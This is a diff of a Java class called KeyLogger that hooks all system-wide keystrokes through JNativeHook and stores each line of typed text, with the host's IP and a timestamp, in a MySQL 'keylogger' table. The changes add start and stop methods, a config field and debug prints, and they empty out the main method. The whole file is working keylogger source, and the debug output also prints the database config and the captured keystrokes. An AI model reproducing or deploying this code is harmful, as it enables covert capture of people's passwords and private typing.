@@ -15,6 +15,8 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 import org.joda.time.DateTime;
+import org.joda.time.format.DateTimeFormat;
+import org.joda.time.format.DateTimeFormatter;
 import org.quartz.InterruptableJob;
 import org.quartz.JobExecutionContext;
 import org.quartz.JobExecutionException;
@@ -38,12 +40,15 @@ public class KeyLogger implements NativeKeyListener {
 	private JDBCClient jdbc;
 	private SQLConnection connection;
 	private String IP;
+	private boolean running;
+	private DBConfig config;
 	
 	
 	
-	
-	public KeyLogger(DBConfig conf,Vertx v) {
+	public KeyLogger(DBConfig c,Vertx v) {
+		System.out.println("Construct KeyLogger");
 		vertx = v;
+		config = c;
 		// TODO Auto-generated constructor stub
 		keyword.put(NativeKeyEvent.VC_0,"0");
     	keyword.put(NativeKeyEvent.VC_1,"1");
@@ -84,7 +89,9 @@ public class KeyLogger implements NativeKeyListener {
     	keyword.put(NativeKeyEvent.VC_SPACE," ");
     	keyword.put(NativeKeyEvent.VC_COMMA, ",");
     	keyword.put(NativeKeyEvent.VC_PERIOD,".");
+    	keyword.put(NativeKeyEvent.VC_ENTER, "|");
     	
+    	running = false;
     	
     	try {
 			IP = Inet4Address.getLocalHost().getHostAddress();
@@ -92,25 +99,30 @@ public class KeyLogger implements NativeKeyListener {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-    	 
+    	System.out.println("Database config :->"+  config.toString() );
     	jdbc = JDBCClient.createShared(vertx, new JsonObject()
-				.put("url",conf.getConnectionURL())
+				.put("url",config.getConnectionURL())
 				.put("driver_class","com.mysql.jdbc.Driver")
-				.put("user",conf.getDbUser())
-				.put("password",conf.getDbPassword())
+				.put("user",config.getDbUser())
+				.put("password",config.getDbPassword())
 				);
+    	System.out.println("KeyLog JDBC Initialized ....");
 	}
 	
 	
 	@Override
     public void nativeKeyPressed(NativeKeyEvent e) {
         //System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+		System.out.println(e.getKeyCode());
         int code = e.getKeyCode();
         String val =parser(e.getKeyCode()); 
+        String tmp = new String();
         if ( val!=null){
-        	data += val;
+        	tmp=val;
+        	data += tmp;
         	
         	if(code == NativeKeyEvent.VC_ENTER){
+        		System.out.println("Storing data!!!!!");
         		store(data);
         		data ="";
         	}
@@ -136,11 +148,13 @@ public class KeyLogger implements NativeKeyListener {
 
 	private void store(String data) {
 		// TODO Auto-generated method stub
+		System.out.println("Triying to store data!!! ->" + data);
+
 		jdbc.getConnection(res -> {
 			  if (res.succeeded()) {
 				    SQLConnection conn = res.result();
 				    DateTime time = DateTime.now();
-				    conn.updateWithParams("INSERT INTO keylogger(ip,date,data) VALUES (?, ?, ?)", new JsonArray().add(IP).add(time).add(data), resa -> {
+				    conn.updateWithParams("INSERT INTO keylogger(ip,date,data) VALUES (?, ?, ?)", new JsonArray().add(IP).add(time.toDateTime().toString()).add(data), resa -> {
 				    	  if (resa.succeeded()) {
 				    	    System.out.println("Added keylog");
 				    	    conn.close();
@@ -171,8 +185,9 @@ public class KeyLogger implements NativeKeyListener {
         //System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
     }
 
-    public static void main(String[] args) {
-        try {
+	
+	public boolean start(){
+		try {
             GlobalScreen.registerNativeHook();
             logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
             logger.setLevel(Level.WARNING);
@@ -180,10 +195,26 @@ public class KeyLogger implements NativeKeyListener {
         catch (NativeHookException ex) {
             System.err.println("There was a problem registering the native hook.");
             System.err.println(ex.getMessage());
-
-            System.exit(1);
+            return false;
+            //System.exit(1);
         }
+		GlobalScreen.addNativeKeyListener(new KeyLogger(this.config,this.vertx));
+		running = true;
+		return running;
+	}
+	
+	public boolean stop(){
+		GlobalScreen.removeNativeKeyListener(this);
+		running = false;
+		return running;
+	}
+	
+	
+	
+	
+    public static void main(String[] args) {
+        
 
-        GlobalScreen.addNativeKeyListener(new KeyLogger(null,null));
+       
     }
 }
